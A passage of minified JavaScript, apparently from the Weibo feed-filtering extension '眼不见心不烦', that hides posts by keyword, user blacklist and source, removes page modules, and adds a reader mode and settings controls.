if(!f)return!1;var n=c.scope(),b="1"===e.getAttribute("isforward"),a=1===n?e.querySelector(".WB_detail>.WB_info .WB_name"):null,t=e.querySelector(".WB_detail>.WB_text"),m=e.querySelector(".WB_detail>.WB_func .WB_from>em+a"),p=e.querySelector(".WB_media_expand .WB_info .WB_name"),q=e.querySelector(".WB_media_expand .WB_text"),u=e.querySelector(".WB_media_expand .WB_func .WB_from>em+a"),r=e.querySelector(".WB_media_expand .WB_func .WB_time"),x=b?r?r.href:null:null,y=a?a.getAttribute("usercard"):null;
if(!t)return!1;var A=1===n?"@"+a.getAttribute("nick-name")+": ":"",A=A+l(t);b&&(p&&q)&&(A+="////@"+p.getAttribute("nick-name")+": "+l(q));if(!d.filterPaused&&!(d.filterOthersOnly&&e.querySelector('.WB_detail>.WB_func>.WB_handle a[action-type="feed_list_delete"]')||h(A,"whiteKeywords"))){if(function(){return 1===n&&d.filterPromotions&&"ad"===e.getAttribute("feedtype")||d.filterDeleted&&b&&!p||(1===n&&a&&-1<d.userBlacklist.indexOf(a.getAttribute("usercard").match(/id=(\d+)/)[1])||b&&p&&-1<d.userBlacklist.indexOf(p.getAttribute("usercard").match(/id=(\d+)/)[1]))||
d.filterFeelings&&e.querySelector("div.feelingBoxS")||(v(m,"sourceKeywords")||b&&v(u,"sourceKeywords"))||d.filterDupFwd&&x&&g[x]&&g[x].length>=Number(d.maxDupFwd)&&-1===g[x].indexOf(f)||d.filterFlood&&y&&k[y]&&k[y]>=Number(d.maxFlood)&&-1===k[y].indexOf(f)||h(A,"blackKeywords")?!0:Array.prototype.some.call(e.getElementsByTagName("A"),function(a){return"http://t.cn/"===a.href.substring(0,12)&&h(a.title,"URLKeywords")?!0:!1})}())return e.style.display="none",!0;q=v(m,"sourceGrayKeywords");r=h(A,"grayKeywords");
!q&&b&&(q=v(u,"sourceGrayKeywords"));if(r||q){var z;1===n&&(z=a.cloneNode(!1),z.textContent="@"+a.getAttribute("nick-name"),z.className="");t=document.createElement("a");t.href="javascript:void(0)";t.className="wbpTip";var w=document.createElement("a");w.href="javascript:void(0)";w.className="wbpTipKeyword";w.textContent=r||q;1===n?(t.appendChild(document.createTextNode("本条来自")),t.appendChild(z),t.appendChild(document.createTextNode("的微博因"))):2===n&&t.appendChild(document.createTextNode("本条微博因"));
t.appendChild(document.createTextNode(r?"内容包含“":"来源名称包含“"));t.appendChild(w);t.appendChild(document.createTextNode("”而被隐藏，点击显示"));z=document.createElement("div");z.className="S_line2 wbpTipLine";e.insertBefore(z,e.firstChild);e.insertBefore(t,z);return!0}}e.style.display="";d.filterPaused||(d.filterDupFwd&&x&&(g[x]||(g[x]=[]),-1===g[x].indexOf(f)&&g[x].push(f)),d.filterFlood&&y&&(k[y]||(k[y]=[]),-1===k[y].indexOf(f)&&k[y].push(f)));return!1},p=function(){c.scope()&&(g={},k={},Array.prototype.forEach.call(document.querySelectorAll(".WB_feed_type"),
q))},m=function(d){d&&c.click(d,function(d){var e=d.target;e&&"A"===e.tagName&&("wbpTipKeyword"===e.className?(B(),d.stopPropagation()):"wbpTip"===e.className&&(c.remove(e.nextSibling),c.remove(e)))})},u=function(c){c&&c.addEventListener("click",function(c){if(!d.directBigImg)return!0;var e=c.target;e&&("images_view_tobig"===e.getAttribute("action-type")&&e.getAttribute("action-data").match(/pid=(\w+)&mid=(\d+)&uid=(\d+)/))&&(window.open("http://photo.weibo.com/"+RegExp.$3+"/wbphotos/large/mid/"+
RegExp.$2+"/pid/"+RegExp.$1,"_blank"),c.stopPropagation())},!0)};c.scope()&&(m(c.select(".WB_feed")),u(c.select(".WB_feed")));document.addEventListener("DOMNodeInserted",function(d){if(0!==c.scope())if(d=d.target,"DIV"===d.tagName&&d.classList.contains("WB_feed_type"))q(d);else if("DIV"===d.tagName&&d.classList.contains("W_loading")){if(d=d.getAttribute("requesttype"),"search"===d||"page"===d)g={},k={}}else"DIV"===d.tagName&&d.classList.contains("WB_feed")&&(m(d),u(d),p())},!1);return p}(),r=function(){var g=
{Ads:'#plc_main [id^="pl_rightmod_ads"], #Box_right [id^="ads_"], div[ad-data], .WB_feed .popular_buss',Stats:"#pl_rightmod_myinfo .user_atten",InterestUser:"#trustPagelet_recom_interestv5, #trustPagelet_indexright_recom[ucardconf] .WB_right_module:nth-of-type(2)",Topic:"#trustPagelet_zt_hottopicv5, #trustPagelet_indexright_recom[ucardconf] .WB_right_module:nth-of-type(1)",Member:"#trustPagelet_recom_memberv5",AllInOne:"#trustPagelet_recom_allinonev5, #trustPagelet_indexright_recom[ucardconf] .WB_right_module:nth-of-type(3)",
Notice:"#pl_rightmod_noticeboard",Footer:"div.global_footer",Activity:"#pl_content_biztips",RecommendedTopic:'#pl_content_publisherTop div[node-type="recommendTopic"]',App:"#pl_leftnav_app",Level:"span.W_level_ico",CommentTip:'div[node-type="feed_privateset_tip"]',MemberTip:'div[node-type="feed_list_shieldKeyword"]',FriendFollow:".B_index .WB_feed .WB_feed_type:not([mid])",FollowGuide:".layer_userguide_brief",TopComment:"#pl_content_commentTopNav",Medal:".pf_badge_icon",RecomFeed:'div[node-type="feed_list_recommend"]',
Nofollow:"#pl_profile_unfollow",MyRightSidebar:".B_profile .W_main_c, .B_profile .WB_feed .repeat .input textarea { width: 100% } .B_profile .W_main_2r",ProfCover:"#plc_profile_header { min-height: 250px } #plc_profile_header .pf_head { top: 10px } #plc_profile_header .pf_info { margin-top: 20px } #plc_profile_header .S_bg5 { background-color: transparent !important } #pl_profile_cover",ProfStats:"#plc_profile_header { min-height: 195px } #pl_profile_photo .user_atten",MyRelation:"#pl_profile_moduleMyRelation",
Relation:"#pl_profile_moduleHisRelation",Album:"#pl_profile_modulealbum",AppWidget:"#pl_profile_appWidget, #trustPagelet_profile_openApplist",FeedRightSidebar:".B_onefeed .W_main_c, .B_onefeed .WB_detail .WB_media_expand .input textarea { width: 100% } .B_onefeed .W_main_2r",RecomPerson:"#pl_rightmod_recomperson",RecomTopic:"#trustPagelet_mblog_topic",RecomWeibo:"#pl_rightmod_recommblog",RecomWeiba:"#trustPagelet_mblog_weiba",RecomWeikan:"#trustPagelet_mblog_weikan",HotWeibo:"#trustPagelet_mblog_hotmblog",
MemberIcon:".ico_member, .ico_member_dis",VerifyIcon:".approve, .approve_co",DarenIcon:".ico_club",VgirlIcon:".ico_vlady",PaiIcon:".ico_pai"},k=function(){if(!c("wbpShowSettings")){var b=c.select("ul.sort");if(!b)return!1;var a=document.createElement("li");a.id="wbpShowSettings";a.className="item";a.innerHTML='<a href="javascript:void(0)" class="item_link S_func1">眼不见心不烦</a>';c.click(a,B);b.appendChild(a)}return!0},h=function(){function b(){null!==e&&500>(new Date).getTime()-e&&(clearTimeout(f),f=
null);e=(new Date).getTime();f=setTimeout(function(){a&&(a.style.visibility=0<window.scrollY?"visible":"hidden")},100)}var a=null,e=null,f=null;return function(){if(!d.floatBtn&&a)return window.removeEventListener("scroll",b,!1),c.remove(a),a=null,!0;if(d.floatBtn&&!a){var e=c("base_scrollToTop");if(!e)return!1;a=document.createElement("a");a.href="javascript:void(0)";a.title="眼不见心不烦";a.id="wbpFloatBtn";a.innerHTML='<span class="S_line5" style="padding: 4px 0 6px; height: auto">★</span>';a.className=
"W_gotop S_line3";a.style.bottom="75px";a.style.height="24px";c.click(a,B);e.parentNode.appendChild(a);window.addEventListener("scroll",b,!1);b();return!0}return!1}}(),f=function(){var b=c("wbpReaderModeStyles");if(d.readerModeIndex||d.readerModeProfile){b||(b=document.createElement("style"),b.type="text/css",b.id="wbpReaderModeStyles",document.head.appendChild(b));var a=Number(d.readerModeWidth);b.innerHTML="";d.readerModeIndex&&(b.innerHTML+=".B_index .W_main_l, .B_index .W_main_r, .B_index #Box_center>div:not(#pl_content_homeFeed), .B_index .group_read, .B_index .global_footer { display: none }\n.B_index #pl_content_top, .B_index .WB_global_nav { top: -40px }\n.B_index { background-position-y: -40px }\n.B_index .W_miniblog { padding-top: 20px; background-position-y: -40px }\n.B_index .W_main { width: "+
a+"px !important; background: "+d.readerModeBackColor+" }\n.B_index #Box_center, .B_index .W_main_a { width: "+a+"px }\n.B_index .WB_feed .repeat .input textarea { width: 100% }\n.B_index .WB_feed .WB_screen { margin-left: "+(a-48)+"px }\n.B_index .W_gotop { margin-left: "+a/2+"px !important }\n");d.readerModeProfile&&(b.innerHTML+=".B_profile #plc_profile_header, .B_profile #pl_profile_nav, .B_profile #pl_profile_cover, .B_profile .group_read, .B_profile .W_main_2r, .B_profile .group_read, .B_profile .global_footer { display: none }\n.B_profile #pl_content_top, .B_profile .WB_global_nav { top: -40px }\n.B_profile { background-position-y: -40px }\n.B_profile .W_miniblog { padding-top: 20px; background-position-y: -40px }\n.B_profile .W_main { width: "+
a+"px !important; background: "+d.readerModeBackColor+" }\n.B_profile .W_main_c { padding-top: 0; width: "+a+"px }\n.B_profile .WB_feed .repeat .input textarea { width: 100% }\n.B_profile .W_gotop { margin-left: "+a/2+"px !important }\n");if(!d.readerModeTip&&(1===c.scope()&&d.readerModeIndex||2===c.scope()&&d.readerModeProfile))c.STK.ui.alert("欢迎进入极简阅读模式！<br><br>您可以按【F8】键快速开关本模式，也可以在“眼不见心不烦”插件设置“改造版面”页进行选择。"),d.readerModeTip=!0,d.save(!0)}else b&&c.remove(b)},l=function(){var b="";d.hideMods.forEach(function(a){g[a]&&
(b+=g[a]+" { display: none !important }\n")});var a=d.tipTextColor,b=b+(".wbpTip:not(:hover) { background-color: "+d.tipBackColor+"; border-color: "+a+"; color: "+a+"; }"),a=c("wbpModuleStyles");a||(a=document.createElement("style"),a.type="text/css",a.id="wbpModuleStyles",document.head.appendChild(a));a.innerHTML=b+"\n";if(-1<d.hideMods.indexOf("FollowGuide")&&(c.remove(c.select('#pl_guide_homeguide > div[node-type="follow_dialog"]')),a=c.select(".layer_userguide_brief"))){for(;!a.classList.contains("W_layer");)a=
a.parentNode;a.previousSibling.style.zIndex===a.style.zIndex&&c.remove(a.previousSibling);c.remove(a)}},r=function(b){if(d.noDefaultFwd&&(b=b.querySelector('.commoned_list .W_checkbox[name="forward"]'))&&b.checked)b.checked=!1},q=function(b){if(d.noDefaultGroupPub&&(b=b.querySelector('.limits a[node-type="showPublishTo"]')))b.firstChild.innerHTML="公开",b.setAttribute("action-data","rank=0")},p=c.select(".W_main_l"),m;p&&(m=p.querySelector(".WB_left_nav"));var u=function(){if(m&&"pl_leftNav_relation"!==
m.id)if(d.mergeSidebars&&!m.id){var b=c.select(".W_main_r"),a=c("pl_rightmod_myinfo");b&&(p.style.display="none",m.id="wbpNavBar",c.select(".W_main").style.cssText="width: 830px; background-position: -150px 0",b.insertBefore(m,a?a.nextSibling:b.firstChild))}else!d.mergeSidebars&&m.id&&(m.id="",p.style.display="none",c.select(".W_main").style.cssText="",p.appendChild(m),p.style.display="")},e=function(b){var a=b.querySelector("ul.userdata a"),e=b.querySelector(".links > p");if(!a||!e)return!1;var f=
a.pathname.split("/")[1];if(f===c.uid)return!1;e.childElementCount&&(a=document.createElement("span"),a.className="W_vline",a.innerHTML="|",e.appendChild(a));a=document.createElement("a");a.href="javascript:void(0)";a.innerHTML=-1===d.userBlacklist.indexOf(f)?"屏蔽":"解除屏蔽";c.click(a,function(){var a=d.userBlacklist.indexOf(f);-1===a?d.userBlacklist.push(f):d.userBlacklist.splice(a,1);d.save();for(C();"W_layer"!==b.className;)b=b.parentNode;b.style.display="none"});e.appendChild(a)},s=function(){f();
k();h();u();l();var b=c("custom_style")||document.head.querySelector('link:not([id])[href*="/skin/"]'),a=c("wbpOverrideSkin");b&&(c.uid===c.config.oid&&d.overrideMySkin||c.uid!==c.config.oid&&d.overrideOtherSkin?(a||(a=document.createElement("link"),a.id="wbpOverrideSkin",a.type="text/css",a.rel="stylesheet",a.charset="utf-8",document.head.insertBefore(a,b)),a.href=c.config.cssPath+"skin/"+d.skinID+"/skin"+("zh-cn"!==c.config.lang?"_CHT":"")+".css?version="+c.config.version,b.disabled=!0):a&&(c.remove(a),
b.disabled=!1));b=".W_person_info { margin: 0 20px 20px !important }\n";a=c("wbpCustomStyles");a||(a=document.createElement("style"),a.type="text/css",a.id="wbpCustomStyles",document.head.appendChild(a));d.showAllGroups&&(b+='#pl_leftnav_group div[node-type="moreList"] { display: block !important } #pl_leftnav_group .level_2_Box > .levmore { display: none }\n');d.showAllMsgNav&&(b+="#pl_leftnav_common > .level_1_Box > .lev2_new { display: block !important }\n");d.unwrapText&&(b+='.WB_info, .WB_text { display: inline } .WB_info+.WB_text:before { content: "：" } .WB_func { margin-top: 5px } .B_index .WB_feed .W_ico16 { vertical-align: -3px !important }\n');
d.mergeSidebars&&(b+="body:not(.S_profile) .W_gotop { margin-left: 415px }\n");d.floatSidebar&&(b=d.mergeSidebars?b+"body:not(.S_profile) .W_main_r { position: fixed; margin-left: 600px; } body:not(.S_profile) .W_main_r > div { display: none } body:not(.S_profile) #wbpNavBar, #pl_rightmod_myinfo { display: block !important }\n":b+"body:not(.S_profile) .WB_left_nav { position: fixed; width: 150px }\n");d.overrideMyBack&&(b+="body:not(.S_profile) .W_main { background: none "+d.backColor+" !important } body:not(.S_profile) .S_bg4, body:not(.S_profile) .W_main_a, body:not(.S_profile) .W_main_bg { background: none transparent !important }\n");
d.overrideOtherBack&&(b+=".S_profile .W_profile_bg { background-color: "+d.backColor+" } .S_profile .S_bg4:not(.W_profile_bg), .S_profile .S_bg5, .S_profile .profile_tabbig { background: none transparent !important }\n");d.useCustomStyles&&(b+=d.customStyles);a.innerHTML=b+"\n";r(document);q(document)},n=document.createElement("style");n.type="text/css";n.id="wbpStyles";n.innerHTML='.wbpTip{border:1px solid;display:block;line-height:23px;text-align:center}.wbpTip:hover{background-color:#D0FFD0;border-color:#40D040;color:#40D040;margin-bottom:10px}.wbpTip:not(:hover)~:not(.wbpTipLine){display:none !important}.wbpTip:hover~*{opacity:0.5}.wbpTip:hover+.wbpTipLine{display:none}.wbpTipLine{padding-bottom:20px;border-bottom-style:solid;border-bottom-width:1px}#wbpNavBar{margin-bottom:20px}#wbpNavBar .lev a,#wbpNavBar .lev2 a,#wbpNavBar .levmenu,#wbpNavBar .levmenu .lm_li:hover{background-image:none}#wbpNavBar .lev a.lev_curr{background-color:transparent}#wbpNavBar .left_nav_line fieldset .btns{margin-left:148px}#wbpNavBar .WB_left_nav .lev_edit .lev a{width:200px}.wbpSettings p{line-height:150%}.wbpSettings p+p{margin-top:10px}.wbpSettings em.W_vline{margin:0 8px}.wbpSettings table{line-height:30px;margin-top:8px}.wbpSettings span.link{position:relative}.wbpSettings span.link a>span{display:none}.wbpSettings span.link a>span li{list-style:circle inside;padding-left:1em;text-indent:-1em}.wbpSettings span.link a>span li+li{margin-top:5px}.wbpSettings span.link a:hover>span{display:block;position:absolute;margin-top:10px;margin-left:-100px;width:250px;padding:5px;z-index:20000;background:#FFFFB0;color:black;border:1px solid #808000;text-align:left;text-decoration:none;border-radius:3px 3px;box-shadow:3px 3px 3px rgba(0,0,0,0.2)}.wbpTabHeaders{float:left;width:100px;margin-right:10px}.wbpTabHeaders a{display:block;padding:6px 0;text-align:center;text-decoration:none}.wbpTabHeaders a:hover{background-color:#C6E8F4}.wbpTabHeaders a.current{background-color:#79C5E9;color:white;cursor:default}.wbpInput{border:1px solid #D2D5D8;padding:0 2px}.wbpInlineInput{display:inline-block;width:30px;margin:0 3px;vertical-align:middle}.wbpInput input{width:100%;height:22px;border:0;padding:0;margin:0;display:block}.wbpSettings>div{margin-top:15px}.wbpSettings textarea{width:440px;margin-top:10px;border:1px solid #D2D5D8}.wbpSettings input[type="checkbox"]{vertical-align:middle;margin-right:5px}.wbpTabModules tr.wbpRowSpacing td{padding-top:10px}.wbpTabModules i.W_ico16{display:inline-block !important}.wbpKeywordBlock{margin-top:10px;border:1px solid #D2D5D8;padding:8px 8px 0}.wbpKeywordBlock em{font-weight:bold;margin-right:15px}.wbpToolBtns{width:105px;text-align:right}.wbpToolBtns a+a{margin-left:5px}.wbpListWrapper{margin:8px 0;max-height:120px;overflow:hidden}.wbpListWrapper:hover{overflow-y:auto}.wbpKeywordsList{margin-top:-5px;line-height:18px}.wbpKeywordsList a{margin:5px 5px 0 0;padding:0 4px;border:1px solid;display:inline-block;height:18px;white-space:nowrap}.wbpKeywordsList a:hover{text-decoration:none}.wbpWhiteKeywordsList a{border-color:#008000;color:#008000}.wbpWhiteKeywordsList a.regex{background-color:#80FF80}.wbpWhiteKeywordsList a:hover{border-color:#008000;background-color:#D0FFD0}.wbpBlackKeywordsList a{border-color:#D00000;color:#D00000}.wbpBlackKeywordsList a.regex{background-color:#FFB0B0}.wbpBlackKeywordsList a:hover{border-color:#FF0000;background-color:#FFD0D0}.wbpGrayKeywordsList a{border-color:#808000;color:#808000}.wbpGrayKeywordsList a.regex{background-color:#FFFF00}.wbpGrayKeywordsList a:hover{border-color:#808000;background-color:#FFFFB0}.wbpUserList>a{margin:5px 5px 0 0;padding:3px;border:1px solid;display:inline-block;cursor:pointer;text-align:center;text-decoration:none}';
document.head.appendChild(n);document.addEventListener("DOMNodeInserted",function(b){var a=c.scope();b=b.target;"DIV"===b.tagName&&(a&&b.classList.contains("group_read")?k():b.classList.contains("name_card")?e(b):b.classList.contains("W_main_r")||b.querySelector(".W_main_r")?u():"DIV"===b.tagName&&"follow_dialog"===b.getAttribute("node-type")&&-1<d.hideMods.indexOf("FollowGuide")?c.remove(b):b.querySelector(".commoned_list")?r(b):b.classList.contains("send_weibo")&&q(b))},!1);document.addEventListener("DOMNodeRemoved",
function(b){m&&m.id&&(b=b.target,"DIV"===b.tagName&&b.querySelector("#wbpNavBar")&&(m.id="",p.appendChild(m)))});document.addEventListener("keyup",function(b){if(!B.shown()){var a=c.scope();a&&119===b.keyCode&&(1===a?d.readerModeIndex=!d.readerModeIndex:d.readerModeProfile=!d.readerModeProfile,d.save(),f())}},!1);s.modules=g;return s}();c.get(c.uid.toString(),void 0,function(g){d.load(g)?g&&d.version<c.version&&(d.version=c.version,d.save(!0),d.updateNotify&&alert("您已更新到“眼不见心不烦”v1.1.3：\n\n- 可选择点击“查看大图”直接打开大图\n- 增加对首页时间线“好友关注”的屏蔽\n- 更新后首次使用时显示新功能")):
alert("“眼不见心不烦”设置读取失败！\n设置信息格式有问题。");c.scope()&&C();r()})})();